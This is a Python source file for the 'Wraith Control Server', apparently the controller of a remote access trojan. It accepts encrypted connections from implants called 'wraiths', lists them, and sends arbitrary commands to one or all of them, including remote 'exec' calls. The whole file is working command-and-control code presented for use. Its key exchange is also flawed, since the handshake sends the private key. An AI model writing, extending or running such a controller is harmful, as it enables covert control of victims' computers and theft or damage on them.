#!/usr/bin/python3

# SETTINGS
LISTEN_IP = ""
LISTEN_PORT = 8470

# Imports
import socket
import threading
import curses
import time
import sys
import re
from curses.textpad import Textbox
from cryptography.fernet import Fernet
from curses.textpad import Textbox
import nacl.utils
from nacl.public import PrivateKey, Box

# Wrapped by curses to ensure terminal is restored on error
def main(stdscr):
    try: # Just to exit gracefully on keyboard interrupt
        global connections, server, stdout

        # Dict of connected clients
        connections = {}

        # CLASS DEFINITIONS
        # Connection class to manage connections
        class Connection(object):
            # When an object is created...
            def __init__(self,conn,addr,thread_id):
                # Arg variables
                self.conn = conn
                self.addr = addr
                self.thread_id = thread_id
                # Variables to be defined by the manager thread
                self.encryption_key = None
                self.wraith_fingerprint = None
                # Variables to control behaviour
                self.send_in_progress = False
            # Encrypt command
            def encr_msg(self,msg):
                try: fernet = Fernet(self.encryption_key)
                except: return False
                try: msg.encode()
                except: pass
                try: return fernet.encrypt(msg)
                except: return False
            # Decrypt command
            def decr_msg(self,msg):
                try: fernet = Fernet(self.encryption_key)
                except: return False
                try: msg = msg.encode()
                except: pass
                try: return fernet.decrypt(msg).decode()
                except: return False
            # Test the connection to client
            def test_connection(self):
                try:
                    if not self.send_data("ctp",False): raise
                    return True
                except: return False
            # Send command to client
            def send_data(self,data,encrypt=True):
                while self.send_in_progress: pass # Make sure messages don't overlap
                self.send_in_progress = True
                try: data = data.encode()
                except AttributeError: pass
                try:
                    if encrypt==False: self.conn.send("ctxt;".encode()+data+"\0".encode())
                    else: self.conn.send(self.encr_msg(data)+"\0".encode())
                    self.send_in_progress = False
                    return True
                except:
                    self.send_in_progress = False
                    return False
            # Receive commands from client
            def recv_data(self):
                buffer = ""
                while True:
                    try: data = self.conn.recv(1).decode()
                    except: return False
                    if data == "\0": break
                    else: buffer += data
                if buffer.startswith("ctxt;"): return buffer.replace("ctxt;", "", 1)
                else: return self.decr_msg(buffer)
            # Close connections and remove this object
            def end(self):
                global connections
                self.conn.close()
                del connections[self.thread_id]

        # A class for a nice, scrolling display
        class ScrollableDisplay(object):
            UP = -1
            DOWN = 1
            def __init__(self):
                self.window = None
                self.width = curses.COLS-1
                self.height = curses.LINES-2
                self.init_curses()
                self.lines = []
                self.max_lines = curses.LINES-2
                self.top = 0
                self.bottom = len(self.lines)
            def init_curses(self):
                self.window = curses.newwin(self.height, self.width, 0, 0)
                self.window.keypad(True)
                curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
                curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_CYAN)
                self.window.nodelay(True)
                self.current = curses.color_pair(2)
            def write(self,lines):
                # Ensure the lines are a string, divide them into window-size chunks and split lines
                lines = "\n".join(re.findall(".{1,%d}" % (curses.COLS-1), str(lines)))
                lines = (line.strip() for line in lines.split("\n"))
                for line in lines:
                    if self.top + self.max_lines == self.bottom: # If a new line was added and we are on the last line
                        self.top += 1
                    self.lines.append(line)
                    self.bottom = len(self.lines)
                    self.max_lines = curses.LINES-2 # In case screen changed
                self.display()
            def scroll(self, direction):
                current_line = self.top + self.max_lines
                if (direction == self.UP) and (current_line > 0):
                    self.top = max(0, self.top - 1)
                    self.display()
                    return
                if (direction == self.DOWN) and (current_line < self.bottom):
                    self.top += 1
                    self.display()
                    return
            def display(self):
                self.window.erase()
                for y, line in enumerate(self.lines[self.top:self.top + self.max_lines]):
                    try: self.window.addstr(y, 0, line)
                    except: pass
                self.window.refresh()

        # A thread to manage input and output using curses
        def io_manager():
            global stdin, stdout

            # Remove ugly grey background
            curses.use_default_colors()

            # Input window
            begin_x = 0; begin_y = curses.LINES-1
            height = 1; width = curses.COLS-1
            stdin_field = curses.newwin(height, width, begin_y, begin_x)
            stdin = Textbox(stdin_field, insert_mode=True)
            stdscr.refresh()

            # Output window
            stdout = ScrollableDisplay()

            current_target = ["server"]

            # Await input from user
            while True:
                # Let the user edit until Enter
                stdin.edit()

                # Get resulting contents
                command = str(stdin.gather())

                command = command.strip()

                # Output command to screen if it's not the scroll command
                if not command.startswith("scroll ") and not command.startswith("use "):
                    if len(current_target) == 1: stdout.write("[{}]~# ".format(current_target[0])+command)
                    else: stdout.write("[ALL]~# "+command)
                elif command.startswith("use "): stdout.write("[server]~# "+command)

                # Process commands before sending
                if current_target[0] == "server" or command.startswith("use ") or command.startswith("scroll "):
                    if command == "help":
                        all_server_commands = [
                            ["help","Show this menu. Args: None"],
                            ["use","Change target to send commands to. Args: <target ID>"],
                            ["scroll","Scroll up or down the output page. Args: <up/down>"],
                            ["connections", "List currently connected wraiths. Args: None"]
                        ]
                        stdout.write("—"*(curses.COLS-1)+"\n"+"Wraith Control Server - Help Menu:")
                        for command in all_server_commands:
                            stdout.write("{} - {}".format(command[0],command[1]))
                        stdout.write("—"*(curses.COLS-1))
                    elif command.startswith("use "):
                        target = command.replace("use ","",1).replace("[","").replace("]","")
                        if target == "server":
                            current_target = ["server"]
                            stdout.write("Changed target to: [{}]".format(target))
                        elif target in connections.keys():
                            current_target = [target]
                            stdout.write("Changed target to: [{}]".format(target))
                        elif target == "*":
                            current_target = [ID for ID in connections.keys()]
                            stdout.write("Changed target to all connected.")
                        else: stdout.write("Target [{}] does not exist!".format(target))
                    elif command.startswith("scroll "):
                        command = command.replace("scroll ","",1)
                        if str(command).lower() == "up": stdout.scroll(stdout.UP)
                        elif str(command).lower() == "down": stdout.scroll(stdout.DOWN)
                        else: stdout.write("Option {} is not recognised!".format(command[0]))
                    elif command == "connections":
                        connection_list = []
                        for connection_id in range(len(connections.keys())): connection_list.append([connection_id+1,list(connections.keys())[connection_id]])
                        try:
                            connection_list_string = "There are {} connected clients:".format(connection_list[-1][0])
                            for connection_id in connection_list: connection_list_string += "\n{}) [{}]({})".format(connection_id[0],connection_id[1],connections[connection_id[1]].addr[0])
                        except IndexError: connection_list_string = "There are no connected clients!"
                        stdout.write(connection_list_string)
                    else: stdout.write("This command is not a valid server command!")

                else:
                    for target in current_target:
                        if target in connections.keys(): connections[target].send_data(command)
                        else: stdout.write("Wraith [{}] is not connected!".format(target))

        threading.Thread(target=io_manager, daemon=True).start()
        time.sleep(1)

        # Connection manager thread
        def connection_manager(thread_id):
            # SERVER-CLIENT HANDSHAKE TO EXCHANGE FERNET KEY
            try:
                my_priv_key = PrivateKey.generate()
                my_publ_key = my_priv_key.public_key
                wraith_publ_key = connections[thread_id].recv_data()
                connections[thread_id].send_data(my_priv_key,False)
                my_box = Box(my_priv_key, wraith_publ_key)
                connections[thread_id].encryption_key = my_box.decrypt(connections[thread_id].recv_data())
            except: return
            try:
                # Get encryption key for further communications
            #    connections[thread_id].encryption_key = connections[thread_id].recv_data()
                # Get wraith's fingerprint
                connections[thread_id].wraith_fingerprint = connections[thread_id].recv_data()
            except: return

            # Change thread ID to wraith's fingerprint
            wraith_fingerprint = connections[thread_id].wraith_fingerprint
            # Before we change the ID, make sure no wraith with the same fingerprint is connected. If it is, delete it.
            try:
                connections[wraith_fingerprint].send_data("exec psutil.Process().terminate()")
                connections[wraith_fingerprint].end()
                time.sleep(2)
                stdout.write("Wraith [{}] ".format(wraith_fingerprint)+"Reconnected!".format(connections[thread_id].addr[0]))
            except KeyError:
                # Let admin know that wraith has connected
                stdout.write("Wraith [{}] ".format(wraith_fingerprint)+"Connected From IP: {}".format(connections[thread_id].addr[0]))
            connections[wraith_fingerprint] = connections.pop(thread_id)
            connections[wraith_fingerprint].thread_id = connections[wraith_fingerprint].wraith_fingerprint
            thread_id = connections[wraith_fingerprint].wraith_fingerprint
            # Delete unnescessary variable
            del wraith_fingerprint
            # Start a thread to monitor Wraith connection status
            threading.Thread(target=connection_tester, args=(thread_id,), daemon=True).start()
            # Receive info packets from wraith and show them to admin
            while thread_id in connections.keys():
                data = connections[thread_id].recv_data()
                if data and data != "ctp": stdout.write("—"*(round((curses.COLS-1)/2))+"\nWraith [{}]:\n".format(thread_id)+"{}".format(data)+"\n"+"—"*(round((curses.COLS-1)/2)))

        def connection_tester(thread_id):
            while thread_id in connections.keys():
                time.sleep(1)
                try:
                    if not connections[thread_id].test_connection():
                        stdout.write("Wraith [{}] Disconnected!".format(thread_id))
                        connections[thread_id].end()
                except KeyError: break


        stdout.write("Starting Wraith Server")

        # Create and bind socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTEN_IP, LISTEN_PORT))
        server.listen(10)

        stdout.write("Listening on {}:{}".format(LISTEN_IP if len(LISTEN_IP) > 0 else "0.0.0.0",LISTEN_PORT))

        # Connection manager thread IDs to manage the threads
        next_thread_ID = 0

        # Accept connections and start manager threads
        while True:
            conn, addr = server.accept()
            connections[next_thread_ID] = Connection(conn,addr,next_thread_ID)
            threading.Thread(target=connection_manager, args=(next_thread_ID,), daemon=True).start()
            next_thread_ID += 1

    except KeyboardInterrupt or SystemExit:
        stdout.write("Closing Wraith Server")

        # This hacky approach is nescessary to prevent runtime errors
        end_connections = []
        for connection in connections.keys(): end_connections.append(connections[connection])
        for connection in end_connections: connection.end()

        try: server.close()
        except: pass

        stdout.write("Exiting")
        time.sleep(2)
        stdout.write("Exit")
        time.sleep(1)
        raise SystemExit

curses.wrapper(main)

# TODO: Delete previous wraith if another with same fingerprint connects
